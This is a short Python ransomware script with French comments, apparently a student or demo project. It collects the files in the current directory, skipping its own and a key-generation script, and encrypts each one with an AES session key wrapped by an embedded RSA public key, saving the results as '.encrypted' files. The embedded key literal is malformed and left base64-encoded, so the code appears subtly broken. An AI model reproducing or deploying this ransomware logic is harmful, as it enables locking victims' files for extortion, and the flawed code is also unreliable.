
import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

# Ce code nous permet d'avoir la cle publique
#with open('public.pem', 'rb') as f:
#    pubKey = f.read()
#print(base64.b64encode(pubKey))

# Remplacer cette ligne par la clé publique réelle
pubKey = b''''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF4VG0xZG1wcXpQQVFqVklBU1BjUQoyS0NaZmJXNEdtWit1RmhzZmg5eG56ZTV3M2dVVHYzMFREeFZwcUZpbWZZb2lLQnN0TC9UYjl2RmM2YjNyRU5HCks3dzMzYkdLcCtRWnJ5OVpBOW1nRm44dklFcFZ2RnEwTEtSM24rbXllSUVrWlBRVDIrdENJWmQxTDNsMDBCdTEKUkhaSkJLU212QXFYYmlyYnZ2V3YxdlNMeEthRDdwemZObU9pcmowMFd4OUdmay9SMk5Sck52MVlsY0hjSXJaMAo0WC9RaXpSdDZwejR3SUxHZ2g0Rk44akNLUzZva2gxa1NyS3RJUTlKd215eDFKS2tsa2FROTZqQUJmenFUT2hQCk1iclhnd25kYkhuUmtCcVZJSUZrbmZuRUtsRDVGbSttc0x0SEpSVVJTK2VRdTM2QzZJUGx2QnJxS1ZPN0pHR1UKeHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''

files = []

def scan_dir():
    """Cette fonction parcourt récursivement les fichiers dans le répertoire courant."""
    for entry in os.scandir():
        if entry.name in ("malware.py", "generatekey.py"):
            continue
        if entry.is_file():
            files.append(entry.path)

def encrypt(data_file, public_key):
    """Cette fonction chiffre les données d'un fichier avec une clé RSA et une clé de session AES."""
    with open(data_file, "rb") as f:
        data = f.read()

    # Créer un objet clé public
    key = RSA.import_key(public_key)
    # générer une clé de session qui sera utilisée pour chiffrer les données.
    session_key = os.urandom(16)

    # Crypter la session avec la clé de session
    cipher = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # Chiffrer la clé de session avec la clé RSA
    cipher_rsa = PKCS1_OAEP.new(key)
    encrypted_session_key = cipher_rsa.encrypt(session_key)

    # Sauvegarder les données encryptees dans un fichier
    encrypted_file = data_file + ".encrypted"
    with open(encrypted_file, 'wb') as f:
        f.write(encrypted_session_key)
        f.write(ciphertext)
        f.write(tag)

# Exemple d'utilisation
scan_dir()
for file in files:
    encrypt(file, pubKey)
